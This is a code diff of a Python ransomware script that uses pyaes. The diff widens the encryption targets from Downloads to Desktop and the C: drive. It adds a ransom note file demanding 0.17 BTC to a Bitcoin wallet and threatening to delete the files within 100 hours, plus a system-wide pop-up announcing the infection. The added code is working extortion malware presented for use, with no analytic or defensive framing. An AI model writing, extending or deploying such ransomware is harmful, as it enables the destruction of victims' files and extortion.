@@ -12,11 +12,19 @@ import pyaes
 from pathlib import Path
 #a=argv[1]
 lst_arq = ["*.txt"]
-lst_past = ["Downloads"]
+lst_past = ["Downloads","Desktop","C:"]
 
 
 print('Criptografando')
 time.sleep(3)
+
+def txt():
+    msg=open(f'{y}\\LEIA.txt','w+')
+    msg.writelines("YOU HAVE BEEN INFECTED BY ENTERING SITES ABOBINABLE BY OUR LEGION.\nAND NOW SUFFERING THE CONSEQUENCES.\n")
+    msg.writelines("ALL YOUR FILES HAVE BEEN ENCRYPTED. \nAND IN 100 HRS THEY WILL BE DELETED.")
+    msg.writelines("SO THAT DOES NOT HAPPEN SEND 0.17BTC TO OUR WALLET: 1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX.")
+    msg.writelines("\n\nWE ARE ANONYMOUS.\nWE ARE LEGION.\nWE DO NOT FORGIVE\nWE DO NOT FORGET.\nEXPECT US")
+    msg.close()
 
 def criptografando():
     for files in lst_arq:
@@ -41,10 +49,15 @@ def criptografando():
 for i in lst_past:
     try:
         desktop = Path.home() / i
-        #download = Path.home() / "Downloads"
     except Exception:
         pass
     os.chdir(desktop)
     criptografando()
-
+y = Path.home() / "Desktop"
+os.chdir(y)
+txt()
+h=9
+while h<10:
+    os.system('msg * YOU HAVE BEEN INFECTED BY CORONADARK. WE LEAVE A FILE ON THE WORK AREA FOR YOU KAKAKAKA.')
+    h=h+1
 
